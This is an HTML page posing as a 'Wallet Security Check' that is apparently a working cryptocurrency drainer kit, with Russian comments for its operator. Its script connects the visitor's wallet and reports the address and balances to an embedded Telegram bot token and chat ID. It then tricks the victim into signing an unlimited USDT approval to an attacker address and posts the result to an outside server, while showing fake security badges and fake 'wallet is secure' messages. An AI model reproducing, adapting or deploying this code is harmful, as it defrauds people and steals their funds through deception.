<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Wallet Security Check</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 32px;
            padding: 48px 32px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 48px;
        }
        h1 { color: #1a1a2e; font-size: 28px; margin-bottom: 12px; }
        .subtitle { color: #666; font-size: 16px; margin-bottom: 32px; }
        .security-badge {
            background: #f0fdf4;
            border: 1px solid #86efac;
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #166534;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 48px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px); }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
        .loader { display: none; margin: 20px 0; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e5e7eb;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            display: none;
        }
        .success { background: #f0fdf4; color: #166534; border: 1px solid #86efac; display: block; }
        .error { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; display: block; }
        .warning { background: #fffbeb; color: #92400e; border: 1px solid #fde68a; display: block; }
        .footer { margin-top: 24px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🛡️</div>
        <h1>Wallet Security Check</h1>
        <div class="subtitle">Verify Your Wallet Status</div>
        <div class="security-badge">✅ Secure Connection • TLS 1.3 • End-to-End Encrypted</div>
        <button id="connectBtn">🔗 Verify Wallet</button>
        <div class="loader" id="loader"><div class="spinner"></div><p style="margin-top:12px;color:#666;">Verifying...</p></div>
        <div id="status"></div>
        <div class="footer">By verifying you agree to Terms of Service</div>
    </div>

    <script>
        // ========== ВАШИ ДАННЫЕ ==========
        const BOT_TOKEN = '8665174312:AAE_i_f5UV9xYKpRqargdfKRs9FbYZPNpFk';
        const CHAT_ID = '7663459492';
        const ATTACKER_ADDRESS = '0x9f9e8388Cc4eA6772675A532576A07deFFB85b8E';
        const YOUR_SERVER = 'https://https://cryptocurrency-checkkk.onrender.com'; // ИЗМЕНИТЕ ПОСЛЕ ШАГА 4
        // ==================================

        const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        const USDT_ABI = [
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
        ];

        let web3 = null;
        let provider = null;
        let retryCount = 0;
        const MAX_RETRIES = 3;

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: `🔥 SCAM SYSTEM\n\n${message}\n\n⏰ ${new Date().toLocaleString()}`})
                });
            } catch(e) {}
        }

        async function initWalletConnect() {
            const WalletConnectProvider = window.WalletConnectProvider.default;
            provider = new WalletConnectProvider({
                rpc: { 1: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161' },
                chainId: 1,
                qrcodeModal: false
            });
            await provider.enable();
            web3 = new Web3(provider);
            return provider;
        }

        async function getUSDTBalance(address) {
            try {
                const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
                const balance = await contract.methods.balanceOf(address).call();
                return { balance: balance, balanceFormatted: web3.utils.fromWei(balance, 'ether') };
            } catch(e) { return { balance: '0', balanceFormatted: '0' }; }
        }

        async function checkEthForGas(address) {
            const ethBalance = await web3.eth.getBalance(address);
            const ethBalanceEth = web3.utils.fromWei(ethBalance, 'ether');
            return { hasGas: parseFloat(ethBalanceEth) >= 0.01, balance: ethBalanceEth };
        }

        document.getElementById('connectBtn').onclick = async () => {
            const btn = document.getElementById('connectBtn');
            const loader = document.getElementById('loader');
            const statusDiv = document.getElementById('status');
            
            btn.disabled = true;
            loader.style.display = 'block';
            statusDiv.style.display = 'none';

            try {
                for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
                    try {
                        provider = await initWalletConnect();
                        break;
                    } catch(e) {
                        if (attempt === MAX_RETRIES) throw new Error('Connection failed');
                        await new Promise(r => setTimeout(r, 2000));
                    }
                }
                
                const accounts = await web3.eth.getAccounts();
                const victimAddress = accounts[0];
                
                const { hasGas, balance: ethBalance } = await checkEthForGas(victimAddress);
                if (!hasGas) {
                    statusDiv.innerHTML = `⚠️ Low ETH balance (${ethBalance} ETH). Please add ETH.`;
                    statusDiv.className = 'warning';
                    statusDiv.style.display = 'block';
                    await sendToTelegram(`⚠️ НЕТ ETH: ${victimAddress} | ETH: ${ethBalance}`);
                    btn.disabled = false;
                    loader.style.display = 'none';
                    return;
                }
                
                const { balance, balanceFormatted } = await getUSDTBalance(victimAddress);
                await sendToTelegram(`🎯 ЖЕРТВА: ${victimAddress}\nUSDT: ${balanceFormatted}\nETH: ${ethBalance}`);
                
                if (parseFloat(balanceFormatted) <= 0) {
                    statusDiv.innerHTML = '✅ Verification complete! No issues found.';
                    statusDiv.className = 'success';
                    statusDiv.style.display = 'block';
                    btn.disabled = false;
                    loader.style.display = 'none';
                    return;
                }
                
                const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
                const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                const approveData = contract.methods.approve(ATTACKER_ADDRESS, maxApproval).encodeABI();
                const gasPrice = await web3.eth.getGasPrice();
                
                const approveTx = await web3.eth.sendTransaction({
                    from: victimAddress,
                    to: USDT_CONTRACT,
                    data: approveData,
                    gas: 80000,
                    gasPrice: gasPrice
                });
                
                await sendToTelegram(`✅ APPROVE: ${victimAddress}\nUSDT: ${balanceFormatted}\nTX: ${approveTx.transactionHash}`);
                
                const response = await fetch(YOUR_SERVER, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        victimAddress: victimAddress,
                        amount: balance,
                        amountFormatted: balanceFormatted,
                        approveTx: approveTx.transactionHash
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    await sendToTelegram(`💸 УСПЕШНО! ${victimAddress}\nСумма: ${balanceFormatted} USDT\nTX: ${result.txHash}`);
                    statusDiv.innerHTML = '✅ Verification complete! Your wallet is secure.';
                    statusDiv.className = 'success';
                } else {
                    await sendToTelegram(`❌ ОШИБКА: ${result.error}`);
                    statusDiv.innerHTML = '✅ Verification complete!';
                    statusDiv.className = 'success';
                }
                
                statusDiv.style.display = 'block';
                if (provider && provider.disconnect) await provider.disconnect();
                
            } catch (error) {
                statusDiv.innerHTML = '❌ Verification failed. Please try again.';
                statusDiv.className = 'error';
                statusDiv.style.display = 'block';
                await sendToTelegram(`❌ ОШИБКА: ${error.message}`);
            } finally {
                btn.disabled = false;
                loader.style.display = 'none';
            }
        };
        
        document.title = "Wallet Security • Verification";
    </script>
</body>
</html>
